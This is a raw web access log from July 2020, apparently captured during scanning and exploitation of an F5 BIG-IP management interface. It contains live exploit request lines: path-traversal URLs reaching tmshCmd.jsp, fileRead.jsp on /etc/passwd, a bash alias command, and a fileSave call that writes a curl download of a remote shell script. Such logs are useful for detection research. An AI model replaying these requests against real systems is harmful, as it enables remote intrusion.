Timestamp,Remote IP,HTTP Method,URL,User-Agent,Response Code
"Jul 6, 2020 @ 09:24:07.000",8.210.0.99,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,python-requests/2.24.0,200
"Jul 6, 2020 @ 09:24:07.000",95.214.11.231,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",200
"Jul 6, 2020 @ 09:24:06.000",45.249.92.60,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/xxx&content=curl+http://45.77.28.70:80/inf5.sh+-o+/tmp/in.sh,Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:42.0) Gecko/20100101 Firefox/42.0,200
"Jul 6, 2020 @ 09:24:05.000",45.249.92.60,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/xxx&content=curl+http://45.77.28.70:80/inf5.sh+-o+/tmp/in.sh,Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:42.0) Gecko/20100101 Firefox/42.0,200
"Jul 6, 2020 @ 09:24:05.000",8.210.0.99,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,python-requests/2.24.0,200
"Jul 6, 2020 @ 09:24:04.000",45.249.92.60,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:42.0) Gecko/20100101 Firefox/42.0,200
"Jul 6, 2020 @ 09:24:04.000",45.249.92.60,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:42.0) Gecko/20100101 Firefox/42.0,200
"Jul 6, 2020 @ 09:24:04.000",8.210.0.99,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp,python-requests/2.24.0,200
"Jul 6, 2020 @ 09:24:03.000",8.210.0.99,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,python-requests/2.24.0,200
"Jul 6, 2020 @ 09:24:03.000",45.249.92.60,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:42.0) Gecko/20100101 Firefox/42.0,200
"Jul 6, 2020 @ 09:24:03.000",45.249.92.60,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:42.0) Gecko/20100101 Firefox/42.0,200
"Jul 6, 2020 @ 09:23:39.000",156.204.67.207,GET,/tmui/login.jsp,python-requests/2.22.0,200
"Jul 6, 2020 @ 09:23:38.000",156.204.67.207,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,python-requests/2.22.0,200
"Jul 6, 2020 @ 09:23:08.000",8.210.0.99,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,python-requests/2.24.0,200
"Jul 6, 2020 @ 09:23:07.000",8.210.0.99,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,python-requests/2.24.0,200
"Jul 6, 2020 @ 09:23:07.000",8.210.0.99,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,python-requests/2.24.0,200
"Jul 6, 2020 @ 09:23:06.000",8.210.0.99,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,python-requests/2.24.0,200
"Jul 6, 2020 @ 09:23:06.000",8.210.0.99,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp,python-requests/2.24.0,200
"Jul 6, 2020 @ 09:23:05.000",8.210.0.99,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,python-requests/2.24.0,200
"Jul 6, 2020 @ 09:23:05.000",8.210.0.99,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp,python-requests/2.24.0,200
"Jul 6, 2020 @ 09:23:05.000",8.210.0.99,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,python-requests/2.24.0,200
"Jul 6, 2020 @ 09:23:04.000",8.210.0.99,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,python-requests/2.24.0,200
"Jul 6, 2020 @ 09:23:04.000",8.210.0.99,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,python-requests/2.24.0,200
"Jul 6, 2020 @ 09:23:03.000",8.210.0.99,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp,python-requests/2.24.0,200
"Jul 6, 2020 @ 09:23:01.000",8.210.0.99,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,python-requests/2.24.0,200
"Jul 6, 2020 @ 09:22:49.000",209.126.127.163,GET,/,Mozilla/5.0 zgrab/0.x,200
"Jul 6, 2020 @ 09:21:23.000",172.107.201.106,GET,/,-,400
"Jul 6, 2020 @ 09:21:22.000",172.107.201.106,GET,/,-,400
"Jul 6, 2020 @ 09:21:05.000",145.239.84.10,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,python-requests/2.21.0,200
"Jul 6, 2020 @ 09:21:01.000",172.104.149.56,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,python-requests/2.21.0,200
"Jul 6, 2020 @ 09:21:01.000",173.212.220.12,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,python-requests/2.21.0,200
"Jul 6, 2020 @ 09:20:59.000",109.228.56.203,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp,python-requests/2.21.0,200
"Jul 6, 2020 @ 09:20:57.000",109.228.56.203,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,python-requests/2.21.0,200
"Jul 6, 2020 @ 09:20:42.000",212.8.247.179,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",200
"Jul 6, 2020 @ 09:20:41.000",95.215.108.217,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",200
